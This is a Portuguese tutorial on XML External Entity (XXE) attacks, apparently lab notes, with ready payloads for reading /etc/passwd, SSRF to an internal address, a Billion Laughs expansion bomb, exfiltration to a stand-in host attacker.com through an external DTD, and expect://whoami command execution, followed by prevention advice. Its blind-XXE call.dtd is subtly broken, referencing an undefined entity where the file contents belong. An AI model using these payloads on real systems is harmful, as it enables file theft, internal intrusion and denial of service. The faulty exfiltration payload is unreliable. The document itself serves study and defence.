## 🧬 XXE — XML External Entity (Entidade Externa XML)

A **XXE (XML External Entity)** é uma vulnerabilidade que ocorre quando uma aplicação processa XML de forma insegura e permite que o atacante **interfira no processamento de entidades externas**.

👉 A falha pode permitir acesso a arquivos locais, requisições feitas pelo servidor (**SSRF**), exposição de informações e, em determinadas condições, **DoS ou RCE**.

---

## ⚙️ Como acontece

A aplicação recebe um XML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```

O XML é enviado para um parser:

```text
XML
 ↓
Parser XML
 ↓
Aplicação
```

Se o parser permitir entidades externas:

```text
XML controlado pelo atacante
          ↓
      Parser XML
          ↓
   Entidade externa
      ↙        ↘
 arquivo       HTTP
 local         request
```

💥 O atacante pode conseguir fazer o servidor acessar recursos que não deveriam estar disponíveis.

---

## 📌 O que são entidades XML?

Entidades são representações que podem ser utilizadas dentro de documentos XML.

Exemplo:

```xml
<!ENTITY nome "Paulo">
```

Depois:

```xml
<usuario>&nome;</usuario>
```

O parser pode interpretar:

```text
&nome;
```

como:

```text
Paulo
```

Algumas entidades predefinidas:

```text
&lt;   → <
&gt;   → >
&amp;  → &
&quot; → "
&apos; → '
```

---

# 🔎 Encontrando XXE

Procure funcionalidades que recebem ou processam:

- XML
- SOAP
- APIs
- uploads XML
- documentos XML
- integrações entre sistemas
- RSS/Atom

Exemplo:

```http
POST /product/stock HTTP/1.1
Content-Type: application/xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>381</productId>
</stockCheck>
```

---

# 💉 Exploração

## 🔹 1. XXE Classic — Leitura de arquivo

Um dos payloads clássicos é:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

O fluxo é:

```text
&xxe;
 ↓
file:///etc/passwd
 ↓
Parser
 ↓
Arquivo
 ↓
Resposta da aplicação
```

💥 Se o parser estiver vulnerável e o resultado for refletido, o conteúdo do arquivo pode aparecer na resposta.

---

## 🌐 2. XXE → SSRF

Também é possível utilizar uma entidade externa para fazer o servidor realizar uma requisição HTTP.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.4.134/admin">
]>
<stockCheck>
    <productId>&xxe;</productId>
</stockCheck>
```

Fluxo:

```text
Atacante
   ↓
XML
   ↓
Parser
   ↓
Servidor
   ↓
HTTP request
   ↓
192.168.4.134/admin
```

💥 Isso pode transformar uma XXE em um vetor de **SSRF**.

---

# 💣 3. XXE → Denial of Service

Entidades também podem ser utilizadas para provocar uma expansão excessiva de dados.

Um exemplo clássico de laboratório é a **XML Bomb / Billion Laughs**.

A ideia é criar entidades que referenciam outras entidades:

```text
Entidade 1
   ↓
Entidade 2
   ↓
Entidade 3
   ↓
Entidade 4
   ↓
Expansão enorme
```

O payload que você colocou é desse tipo:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ELEMENT lolz (#PCDATA)>
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<stockCheck>
  <productId>&lol5;</productId>
</stockCheck>
```

💥 Se o parser expandir todas as entidades, o tamanho do conteúdo pode crescer exponencialmente e consumir recursos.

📌 Em laboratório, é melhor utilizar uma versão pequena/controlada para demonstrar o comportamento, evitando derrubar o serviço.

---

# 👁️ 4. Advanced XXE

Uma técnica avançada utiliza **parameter entities** para carregar uma DTD externa:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://attacker.com/call.dtd">
  %remote;
]>
```

O fluxo:

```text
XML
 ↓
Parameter Entity
 ↓
Servidor externo
 ↓
call.dtd
 ↓
Parser
```

💥 Isso pode ser utilizado em determinados cenários para realizar **Blind XXE / Out-of-Band XXE**.

---

# 🕵️ 5. Advanced XXE — Blind XXE

Quando a aplicação não retorna o resultado diretamente, pode-se tentar utilizar um canal externo para detectar a exploração.

### Payload enviado:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE roottag [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % remote SYSTEM "http://attacker.com/call.dtd">
  %remote;
]>
<roottag>&send;</roottag>
```

### `call.dtd`:

```dtd
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/collect.php?file=&title;'>">
%all;
```

Conceitualmente:

```text
Aplicação vulnerável
        ↓
   Parser XML
        ↓
 /etc/passwd
        ↓
 Requisição externa
        ↓
attacker.com
```

👉 O objetivo do **Blind XXE** é obter uma confirmação ou dados através de um canal externo quando a resposta HTTP normal não mostra o resultado.

⚠️ Para laboratório, substitua `attacker.com` por um domínio/servidor de teste sob seu controle.

---

# 💻 6. XXE → RCE

Em alguns ambientes específicos, XXE pode ser combinada com mecanismos adicionais para chegar à execução de código.

Um exemplo histórico envolve o wrapper `expect`:

```xml
<!DOCTYPE replace [
  <!ENTITY ent SYSTEM "expect://whoami">
]>
```

Se o ambiente possuir suporte ao mecanismo necessário, isso pode tentar executar:

```text
whoami
```

💥 Porém:

```text
XXE ≠ RCE
```

A presença de XXE sozinha **não significa que será possível executar comandos**.

São necessárias condições adicionais no parser, na linguagem e no ambiente.

---

# 📊 Tipos de XXE

|Tipo|Objetivo|
|---|---|
|**Classic XXE**|Leitura de arquivos|
|**XXE → SSRF**|Fazer requisições pelo servidor|
|**Blind XXE**|Exploração sem resposta direta|
|**OOB XXE**|Utilizar canal externo|
|**XXE DoS**|Consumir recursos do servidor|
|**XXE → RCE**|Execução de código em condições específicas|

---

## 🚨 Impactos

Uma XXE pode resultar em:

- leitura de arquivos
- exposição de informações
- SSRF
- acesso a serviços internos
- requisições externas
- DoS
- em cenários específicos, RCE

O impacto depende de:

```text
Parser
   +
Configuração
   +
Privilégios
   +
Recursos acessíveis
```

---

## 🛡️ Como prevenir

- desabilitar **External Entities**
- desabilitar **DTD** quando não for necessário
- utilizar parsers atualizados
- limitar tamanho e complexidade do XML
- impedir requisições externas desnecessárias
- aplicar menor privilégio
- validar os dados recebidos
- manter bibliotecas atualizadas

📌 **Regra de ouro:**

👉 **Se a aplicação não precisa de entidades externas, desabilite-as no parser XML.**